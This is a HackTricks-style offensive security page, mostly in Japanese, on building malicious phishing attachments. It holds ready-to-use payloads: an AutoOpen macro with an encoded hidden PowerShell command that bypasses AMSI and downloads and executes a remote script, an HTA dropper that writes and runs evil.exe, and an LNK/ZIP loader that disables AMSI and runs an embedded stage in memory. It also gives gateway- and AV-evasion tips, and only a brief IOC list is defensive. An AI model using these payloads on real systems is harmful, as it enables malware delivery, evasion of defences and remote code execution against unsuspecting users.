# Phishing ファイルとドキュメント

{{#include ../../banners/hacktricks-training.md}}

## Office ドキュメント

Microsoft Word はファイルを開く前にファイルのデータ検証を行います。データ検証は OfficeOpenXML 標準に対するデータ構造の識別の形で行われます。データ構造の識別中にエラーが発生した場合、解析対象のファイルは開かれません。

通常、マクロを含む Word ファイルは `.docm` 拡張子を使用します。しかし、ファイル拡張子を変更してファイル名を変更しても、マクロ実行機能を維持することが可能です。\
例えば、RTF ファイルは設計上マクロをサポートしませんが、DOCM ファイルを RTF にリネームすると Microsoft Word によって処理され、マクロ実行が可能になります。\
同じ内部構造と仕組みは Microsoft Office Suite（Excel, PowerPoint 等）の全ソフトウェアに適用されます。

以下のコマンドを使用して、いくつかの Office プログラムで実行される拡張子を確認できます:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### 外部画像の読み込み

Go to: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### マクロによるバックドア

マクロを利用して、ドキュメントから任意コードを実行することが可能です。

#### オートロード関数

一般的であればあるほど、AVが検知する可能性が高くなります。

- AutoOpen()
- Document_Open()

#### マクロのコード例
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 手動でメタデータを削除する

ファイルメニューから **File > Info > Inspect Document > Inspect Document** を開くと、Document Inspector が表示されます。**Inspect** をクリックし、次に **Document Properties and Personal Information** の横にある **Remove All** をクリックします。

#### Doc 拡張子

終了したら、**Save as type** ドロップダウンを選択し、形式を **`.docx`** から **Word 97-2003 `.doc`** に変更します。\
これは、**`.docx` 内にマクロを保存できない**ためと、マクロ有効な **`.docm`** 拡張子に対する **偏見**（例：サムネイルアイコンに大きな `!` が表示され、一部の web/email gateway がそれらを完全にブロックする） があるためです。したがって、この **レガシーな `.doc` 拡張子が最良の妥協案** です。

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

An HTA は、HTML とスクリプト言語（VBScript や JScript など）を組み合わせた Windows プログラムです。ユーザーインターフェイスを生成し、ブラウザのセキュリティモデルの制約を受けない「fully trusted」アプリケーションとして実行されます。

An HTA は **`mshta.exe`** を使用して実行され、通常は **Internet Explorer** とともに **インストール** されるため、**`mshta` は IE に依存** します。したがって、IE がアンインストールされていると、HTA は実行できなくなります。
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM 認証を "リモートで" 強制する

**NTLM 認証を "リモートで" 強制する**方法はいくつかあります。たとえば、ユーザがアクセスするメールや HTML に **不可視画像** を追加する（HTTP MitM?）ことや、フォルダを開くだけで **認証** を **誘発する**ような **ファイルのアドレス** を被害者に送ることが考えられます。

**これらのアイデアやその他の詳細は以下のページを参照してください：**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

ハッシュや認証を盗むだけでなく、**NTLM Relay attacks** を実行することもできます：

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

非常に効果的なキャンペーンでは、2つの正規のデコイ文書（PDF/DOCX）と悪意のある .lnk を含む ZIP を配布します。トリックは、実際の PowerShell ローダーが ZIP の生バイト内の固有のマーカーの後に格納されており、.lnk がそれをメモリ上で切り出して実行する点です。

.lnk の PowerShell ワンライナーで実装される典型的なフロー：

1) Desktop、Downloads、Documents、%TEMP%、%ProgramData%、およびカレントワーキングディレクトリの親などの一般的なパスで元の ZIP を探す。  
2) ZIP のバイトを読み、ハードコードされたマーカー（例: xFIQCV）を探す。マーカー以降のすべてが埋め込まれた PowerShell ペイロードである。  
3) ZIP を %ProgramData% にコピーしてそこで展開し、デコイの .docx を開いて正規のように見せる。  
4) 現在のプロセスで AMSI をバイパスする: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) 次のステージをデオブフスク（例: すべての # 文字を削除）して、メモリ上で実行する。

埋め込まれたステージを切り出して実行する PowerShell スケルトンの例：
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
注意
- Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may gate payloads (serve benign ZIPs based on IP/UA).
- 次段階では、base64/XORで暗号化されたshellcodeを復号し、Reflection.Emit + VirtualAlloc経由で実行してディスク痕跡を最小化することが多い。

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- アーカイブデータの末尾にASCIIマーカー文字列（例: xFIQCV）が追加されたZIPファイル。
- .lnk が親/ユーザーフォルダを列挙してZIPを探し、デコイドキュメントを開く。
- AMSIの改ざん（[System.Management.Automation.AmsiUtils]::amsiInitFailed を使用）。
- 長時間稼働するビジネススレッドが、信頼されたPaaSドメインでホストされたリンクで終わる。

## Windows files to steal NTLM hashes

以下のページを確認してください: **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
